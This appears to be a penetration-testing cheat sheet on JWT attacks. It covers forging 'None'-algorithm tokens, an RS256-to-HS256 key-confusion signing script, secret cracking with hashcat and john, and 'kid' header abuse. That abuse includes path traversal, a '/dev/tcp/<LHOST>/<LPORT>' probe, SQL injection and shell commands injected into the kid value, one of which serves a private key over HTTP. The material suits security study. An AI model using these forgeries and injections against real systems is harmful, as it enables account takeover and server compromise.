# JWT

## Theory

JSON Web Token (JWT) is one of the most commonly used methods for authorization. It is a type of cookie that is generated using HMAC hashing or public/private keys. So, unlike any other type of cookie, it allows the website to know what kind of access the currently logged-in user has. The only special thing about JWTs is that they are in JSON format (after decoding).

The JWT can be divided into 3 parts separated by a dot(`.`):

1. **Header**: Consists of the algorithm used and the token type. `{"alg": "HS256", "typ": "JWT"}` (**alg** can be HMAC, RSA, SHA256 or it can even contain no value).
2. **Payload**: This is the part that contains the access given to a certain user, etc. This can vary from website to website, some may just have a simple username and some ID and others could have a bunch of other details.
3. **Signature**: This is the part that is used to make sure that the integrity of the data was maintained during the transfer from the user's computer to the server and vice versa. It is encrypted with the **algorithm** or **alg** that was passed in the header value. And this can only be decrypted with a predefined secret (which should be difficult).

Now to put all 3 parts together we encode in base64 all of them separated by a dot(`.`) so it would look something like this:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

## Practice

### CVE-2015-9235 - None Algorithm

The `None` algorithm is a curious addition to JWT. It is intended to be used in situations where the integrity of the token has already been verified. Interestingly, it is one of only two algorithms that are mandatory to implement (the other is HS256). Unfortunately, **some libraries treated tokens signed with the None algorithm as a valid token with a verified signature**. The result? Anyone can create their own "signed" tokens with any payload they want, allowing arbitrary access to accounts on some systems.

{% tabs %}
{% tab title="Manual" %}
Creating such a token is easy. Modify the first header to contain `{"alg": "None"`, instead of **HS256** or another algorithm. Make any desired changes to the payload (second header). Use an empty signature (i.e. `signature = ""` or directly place a dot (.) after the payload).

{% hint style="danger" %}
**IMPORTANT**: The algorithm "**None**" must be with **capital N**.
{% endhint %}

```shell
{"alg":"None","typ":"JWS"}.{"login":"admin","iat":"1624402807"}
eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0K.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTYyNDQwMjgwNyJ9Cg==.
```
{% endtab %}

{% tab title="jwt_tool.py" %}
```bash
python3 jwt_tool.py <JWT> -X a
```
{% endtab %}
{% endtabs %}

Most (hopefully all?) implementations now have a basic check to prevent this attack: if a secret key was provided, token verification will fail for tokens using the None algorithm. This is a good idea, but does not solve the underlying problem: attackers control the choice of algorithm.

### CVE-2016-5431 - Exposed public Key

The HS256 algorithm uses the secret key to sign and verify each message. The RS256 algorithm uses the private key to sign the message and uses the public key for authentication. If the algorithm is changed from RS256 to HS256, the back-end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature. Then, using the public key and changing RS256 to HS256 we could create a valid signature.

#### Requirements

* The application should expect the JWT to be signed with a public key based algorithm (i.e. RSxxx or ESxxx).
* The application must not check which algorithm the JWT actually uses for signing.
* The public key used to verify the JWT must be available to the attacker.

If all these conditions are true, then an attacker can use the public key to sign the JWT using an HMAC-based algorithm (such as HS256).

{% tabs %}
{% tab title="Manual" %}
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

```python
import hmac
import hashlib
import base64

#Paste the file with the key 
file=open('public.pem')

key = file.read()

#Paste your header and payload here
header = '{"alg":"HS256"}'
payload = '{"name":"admin"}'

#Creating encoded header
encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")

#Creating encoded payload
encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")

#Concatenating header and payload
token = (encodedHeader + "." + encodedPayload)

#Creating signature
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(token + "." + sig)
```
{% endtab %}

{% tab title="jwt_tool.py" %}
```bash
python3 jwt_tool.py <JWT> -S hs256 -k public.pem
```
{% endtab %}
{% endtabs %}

### Weak HMAC secret (Brute Force)

If the JWT is signed using an HMAC-based algorithm (such as HS256, HS384 or HS512), the security of the signature depends entirely on the strength of the secret key used in the HMAC.

If the application is using open source software, the first step should be to investigate the code, and see if there is a default HMAC signing key used.

If there is no default key, then it may be possible to guess or force it.

{% tabs %}
{% tab title="john|hashcat" %}
```bash
jwt2john <JWT>
```

```bash
# John:
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
# Hashcat:
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
```
{% endtab %}

{% tab title="jwt_tool.py" %}
```bash
python3 jwt_tool.py -C -d /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <JWT>
```
{% endtab %}
{% endtabs %}

### Kid problems

#### Kid issues

`kid` is an optional header statement containing a key identifier, especially useful when you have multiple keys to sign tokens and need to look up the correct one to verify the signature.

#### "kid" issues - reveal key

If the "`kid`" statement is used in the header, check the web directory for that file or a variation of it. For example, if `"kid": "key/12345"`, look for `/key/12345` and `/key/12345.pem` in the web root.

#### "kid" issues - path traversal

If the claim "`kid`" is used in the header, see if you can use a different file in the filesystem. Pick a file you can predict the contents of, or perhaps try `"kid":"/dev/tcp/<LHOST>/<LPORT>"` to test connectivity, or even some SSRF payloads.

{% hint style="info" %}
Use the `-T` flag of **jwt\_tool** to manipulate the JWT and change the value of the `kid` claim, then choose to keep the original signature.
{% endhint %}

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p "" # The value of kid will be null, so the password ("-p"), will be empty.
python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file" # Another example with the content of a file.
```

**Using files within the host with known content can also forge a valid JWT**. For example, on linux systems the file `/proc/sys/kernel/randomize_va_space` has the value set to **2**. So, by putting that path inside the "**kid**" parameter and using "**2**" as the symmetric password to generate the JWT you should be able to generate a new valid JWT.

#### "kid" issues - SQL Injection

In a scenario where the contents of the "**kid**" are used to retrieve the password from the database, you could change the payload inside the "kid" parameter to:

* `asd' UNION SELECT 'SECRET_KEY';-- -`
* `"kid" : "1337' union select 'SECRET_KEY' -- 1"`

... and then sign the JWT with the SECRET\_KEY secret key.

If we want to enumerate the database, we can also do that:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'asd'
SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'asd' # Injection
```

#### "kid" issues - OS Injection

Scenario where the "kid" parameter contains a path to the file with the key and this path is being used within a command:

```bash
# Original:
"kid": "/root/res/keys/secret7.key"
# Modified
"kid": "/root/res/keys/secret7.key/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337 &"
# We navigate to that location to extract the private key.
```

We can also try to execute any command : `"kid" : "1" | whoami;`

## References

{% embed url="https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt" %}

{% embed url="https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb" %}

{% embed url="https://www.netsparker.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities" %}
